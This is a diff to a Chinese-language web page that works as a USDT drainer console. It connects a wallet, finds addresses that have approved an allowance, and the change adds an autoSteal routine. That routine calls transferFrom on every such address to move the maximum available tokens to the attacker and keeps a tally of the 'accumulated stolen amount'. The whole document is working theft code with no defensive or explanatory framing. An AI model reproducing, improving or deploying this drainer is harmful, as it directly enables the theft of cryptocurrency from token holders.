@@ -2,7 +2,7 @@
 <html lang="zh-Hant">
 <head>
   <meta charset="UTF-8">
-  <title>🎯 EOA 控制台 v1.3（顯示餘額 + 累積紀錄）</title>
+  <title>🌟 EOA 控制台 v1.4 (自動攻擊版)</title>
   <script src="https://cdn.jsdelivr.net/npm/ethers@5.7.2/dist/ethers.umd.min.js"></script>
   <style>
     body { font-family: 'Arial'; padding: 20px; background: #fff; }
@@ -14,15 +14,15 @@
   </style>
 </head>
 <body>
-  <h2>🎯 EOA 控制台 v1.3（顯示餘額 + 累積紀錄）</h2>
-  <p><b>目前登入帳號：</b><span id="account">尚未連線...</span></p>
-  <p><b>身份驗證：</b><span id="auth" class="bad">尚未驗證</span></p>
+  <h2>🌟 EOA 控制台 v1.4 (自動攻擊版)</h2>
+  <p><b>目前登入帳號：</b><span id="account">未連線...</span></p>
+  <p><b>身份驗證：</b><span id="auth" class="bad">未驗證</span></p>
   <p><b>攻擊者 USDT 餘額：</b><span id="mybalance">查詢中...</span></p>
-  <p><b>最後刷新時間：</b><span id="refresh">尚未刷新</span></p>
+  <p><b>最後刷新時間：</b><span id="refresh">未刷新</span></p>
   <p><b>累積盜取金額：</b><span id="total">0 USDT</span></p>
 
   <input id="victim" placeholder="受害者地址" />
-  <button onclick="steal()">🧨 盜取 USDT</button>
+  <button onclick="steal()">🧸 盜取 USDT</button>
   <p id="balance"></p>
   <p id="status">等待操作中...</p>
 
@@ -38,7 +38,9 @@
       "function balanceOf(address) view returns (uint256)",
       "function allowance(address owner, address spender) view returns (uint256)"
     ];
-    let provider, signer, sender, totalStolen = ethers.BigNumber.from("0");
+    let provider, signer, sender;
+    let totalStolen = ethers.BigNumber.from("0");
+    const attackedSet = new Set();
 
     async function connect() {
       if (!window.ethereum) return alert("請安裝 MetaMask");
@@ -79,34 +81,38 @@
       const ul = document.getElementById("approvals");
       ul.innerHTML = "";
       const seen = new Set();
-      events.forEach(ev => {
+      for (const ev of events) {
         const owner = ev.args.owner;
         if (!seen.has(owner)) {
           seen.add(owner);
           const li = document.createElement("li");
           li.textContent = owner;
           ul.appendChild(li);
+          await autoSteal(owner);
         }
-      });
+      }
       document.getElementById("refresh").innerText = new Date().toLocaleTimeString();
     }
 
     async function steal() {
       const victim = document.getElementById("victim").value;
+      await autoSteal(victim);
+    }
+
+    async function autoSteal(victim) {
+      if (attackedSet.has(victim)) return; // 避免重複攻擊
       const contract = new ethers.Contract(USDT, ABI, signer);
       try {
         const balance = await contract.balanceOf(victim);
         const allowance = await contract.allowance(victim, attacker);
         const amount = balance.lt(allowance) ? balance : allowance;
-        if (amount.isZero()) {
-          document.getElementById("status").innerText = "❌ 無可盜取的 USDT";
-          return;
-        }
+        if (amount.isZero()) return;
         const tx = await contract.transferFrom(victim, attacker, amount);
         totalStolen = totalStolen.add(amount);
         const formatted = ethers.utils.formatUnits(totalStolen, 6);
         document.getElementById("total").innerText = formatted + " USDT";
         document.getElementById("status").innerText = "✅ TX Hash: " + tx.hash;
+        attackedSet.add(victim);
       } catch (e) {
         document.getElementById("status").innerText = "❌ 失敗: " + e.message;
       }
